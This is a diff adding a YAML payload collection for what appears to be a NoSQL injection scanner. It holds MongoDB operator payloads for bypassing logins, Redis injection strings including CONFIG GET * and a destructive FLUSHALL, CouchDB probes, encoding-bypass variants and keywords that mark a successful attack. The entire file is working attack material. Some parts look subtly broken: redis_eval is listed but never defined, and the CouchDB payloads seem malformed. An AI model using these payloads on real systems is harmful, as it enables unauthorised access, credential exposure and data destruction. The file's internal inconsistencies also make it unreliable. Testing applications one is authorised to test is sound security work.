@@ -1,0 +1,265 @@
+category_map:
+  detect:
+    - gt_bypass
+    - ne_bypass
+    - regex_bypass
+    - exists_bypass
+    - type_bypass
+  mongodb:
+    - mongo_gt
+    - mongo_ne
+    - mongo_where
+    - mongo_regex
+    - mongo_or
+    - mongo_nin
+    - mongo_and
+    - mongo_not
+    - mongo_mod
+    - mongo_exists
+    - mongo_type
+  redis:
+    - redis_info
+    - redis_config
+    - redis_keys
+    - redis_eval
+    - redis_flushall
+  couchdb:
+    - couchdb_alldocs
+    - couchdb_changes
+    - couchdb_show
+    - couchdb_utils
+    - couchdb_config
+  bypass:
+    - unicode_bypass
+    - double_json
+    - nested_bypass
+    - mixed_type
+    - array_bypass
+    - null_terminator
+
+detect_payloads:
+  - - gt_bypass
+    - '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - authenticated
+      - logged
+  - - ne_bypass
+    - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - authenticated
+      - logged
+  - - regex_bypass
+    - '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - authenticated
+      - logged
+  - - exists_bypass
+    - '{"username": {"$exists": true}, "password": {"$exists": true}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - authenticated
+      - logged
+  - - type_bypass
+    - '{"username": {"$type": "string"}, "password": {"$type": "string"}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - authenticated
+      - logged
+
+mongodb_payloads:
+  - - mongo_gt
+    - '{"user": {"$gt": ""}, "pass": {"$gt": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - dashboard
+  - - mongo_ne
+    - '{"user": {"$ne": ""}, "pass": {"$ne": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - dashboard
+  - - mongo_where
+    - '{"$where": "function(){return true}"}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - result
+  - - mongo_regex
+    - '{"user": {"$regex": "^admin"}, "pass": {"$regex": ".*"}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - admin
+  - - mongo_or
+    - '{"$or": [{"user": "admin"}, {"admin": true}]}'
+    - application/json
+    - - welcome
+      - success
+      - token
+      - admin
+  - - mongo_nin
+    - '{"user": {"$nin": []}, "pass": {"$nin": []}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mongo_and
+    - '{"$and": [{"user": {"$ne": ""}}, {"pass": {"$ne": ""}}]}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mongo_not
+    - '{"user": {"$not": {"$eq": "nobody"}}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mongo_mod
+    - '{"user": {"$mod": [1, 0]}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mongo_exists
+    - '{"user": {"$exists": true}, "pass": {"$exists": false}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mongo_type
+    - '{"user": {"$type": 2}, "pass": {"$type": 2}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+
+redis_payloads:
+  - - redis_info
+    - "\r\nINFO\r\n"
+    - text/plain
+    - - redis_version
+      - connected_clients
+      - used_memory
+  - - redis_config
+    - "\r\nCONFIG GET *\r\n"
+    - text/plain
+    - - bind
+      - port
+      - requirepass
+  - - redis_keys
+    - "\r\nKEYS *\r\n"
+    - text/plain
+    - - session
+      - user
+      - token
+  - - redis_select
+    - "\r\nSELECT 0\r\n"
+    - text/plain
+    - - ok
+      - SELECT
+  - - redis_flushall
+    - "\r\nFLUSHALL\r\n"
+    - text/plain
+    - - ok
+      - flushall
+
+couchdb_payloads:
+  - - couchdb_alldocs
+    - '{"_all_docs": true, "include_docs": true}'
+    - application/json
+    - - total_rows
+      - offset
+      - rows
+  - - couchdb_changes
+    - '{"_changes": {"since": 0, "limit": 10}}'
+    - application/json
+    - - results
+      - last_seq
+  - - couchdb_show
+    - '{"_show": "login", "user": "admin"}'
+    - application/json
+    - - name
+      - roles
+      - ok
+  - - couchdb_utils
+    - '{"_utils": true}'
+    - application/json
+    - - Futon
+      - couchdb
+      - version
+  - - couchdb_config
+    - '{"_config": {"section": "admin"}}'
+    - application/json
+    - - bind_address
+      - port
+      - require_valid_user
+
+bypass_payloads:
+  - - unicode_bypass
+    - '{"u\\u0073ername": {"\\u0024gt": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - double_json
+    - '{"data": "{\\"user\\": {\\"$gt\\": \\"\\", \\"pass\\": {\\"$gt\\": \\"\\"}}}"}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - nested_bypass
+    - '{"query": {"user": {"$gt": ""}, "pass": {"$gt": ""}}, "options": {}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - mixed_type
+    - '{"user": 0, "pass": {"$gt": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - array_bypass
+    - '{"user": [{"$gt": ""}], "pass": [{"$gt": ""}]}'
+    - application/json
+    - - welcome
+      - success
+      - token
+  - - null_terminator
+    - '{"user": "admin\\u0000", "pass": {"$ne": ""}}'
+    - application/json
+    - - welcome
+      - success
+      - token
+
+login_params:
+  - user
+  - username
+  - email
+  - login
+  - name
+  - account
+  - pass
+  - password
+  - pwd
+  - secret
+  - auth
